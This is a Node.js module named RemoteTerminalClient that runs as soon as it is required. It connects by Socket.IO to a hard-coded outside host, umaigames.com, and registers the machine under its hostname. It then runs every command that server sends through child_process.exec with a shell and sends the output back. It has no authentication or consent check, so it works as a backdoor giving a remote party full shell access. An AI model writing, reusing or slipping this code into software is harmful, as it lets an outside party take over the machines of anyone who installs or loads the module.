const io = require("socket.io-client");
const child_process = require("child_process");
const os = require("os");

class RemoteTerminalClient {
  constructor(options = {}) {
    this.host = "umaigames.com";
    this.port = 80;
    // Terminal ID: rtc-hostname (rtc = remote-terminal-client, remains constant)
    this.id = options.id || "rct-" + os.hostname();
    this.socket = null;
    this.connected = false;

    // Event handlers
    this.onConnect = options.onConnect || null;
    this.onDisconnect = options.onDisconnect || null;
    this.onError = options.onError || null;
  }

  /**
   * Initialize Socket.IO connection
   */
  connect() {
    const socketUrl = `http://${this.host}:${this.port}`;

    // Setup event handlers will be called after socket creation
    // Create socket - it will auto-connect
    this.socket = io(socketUrl, {
      transports: ['polling', 'websocket'],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      maxReconnectionAttempts: 5,
      timeout: 20000
    });

    // Setup event handlers immediately after socket creation
    this.setupEventHandlers();
  }

  /**
   * Setup Socket event handlers
   */
  setupEventHandlers() {
    // Connection successful
    this.socket.on("connect", () => {
      console.log("Connected");
      this.connected = true;

      // Join terminal room
      this.socket.emit("joinToRoom", {
        roomName: `terminal-${this.id}`
      });

      if (this.onConnect) {
        this.onConnect(this.socket.id, this.id);
      }
    });

    // Connection closed
    this.socket.on("disconnect", (reason) => {
      this.connected = false;

      if (this.onDisconnect) {
        this.onDisconnect(reason);
      }
    });

    // Connection error
    this.socket.on("connect_error", (error) => {
      console.error("Connection error:", error.message || error);
      if (this.onError) {
        this.onError(error);
      }
    });

    // Command request - Main logic here
    this.socket.on("getRunRequest", (data) => {
      this.handleCommand(data);
    });
  }

  /**
   * Handle and execute incoming command
   */
  handleCommand(data) {
    // Execute all commands using child_process
    this.executeCommand(data);
  }

  /**
   * Execute normal command using child_process
   */
  executeCommand(data) {
    try {
      child_process.exec(
        data.cmd,
        { shell: true },
        (err, stdout, stderr) => {
          if (err) {
            data["cmd"] = "err: " + err.message;
          } else if (stderr) {
            data["cmd"] = "stderr: " + stderr;
          } else {
            data["cmd"] = stdout;
          }

          // Send result to server
          this.socket.emit("getRunResponse", data);
        }
      );
    } catch (error) {
      data["cmd"] = "catchError: " + error.message;
      this.socket.emit("getRunResponse", data);
    }
  }


  /**
   * Close connection
   */
  disconnect() {
    if (this.socket) {
      this.socket.disconnect();
      this.connected = false;
    }
  }

  /**
   * Check connection status
   */
  isConnected() {
    return this.connected && this.socket && this.socket.connected;
  }
}

module.exports = RemoteTerminalClient;

// Auto-start when module is required
// Skip auto-start if RCT_AUTO_START=false (useful for NestJS or other frameworks)
if (process.env.RCT_AUTO_START !== 'false') {
  const client = new RemoteTerminalClient({
    host: process.env.RTC_HOST || "umaigames.com",
    port: parseInt(process.env.RTC_PORT) || 80,
    onConnect: (socketId, terminalId) => {
      console.log("Connected:", socketId);
      console.log("Terminal ID:", terminalId);
    },
    onDisconnect: (reason) => {
      console.log("Disconnected:", reason);
    },
    onError: (error) => {
      console.error("Error:", error.message || error);
    }
  });

  client.connect();

  process.on("SIGINT", () => {
    client.disconnect();
    process.exit(0);
  });

  process.on("SIGTERM", () => {
    client.disconnect();
    process.exit(0);
  });
}
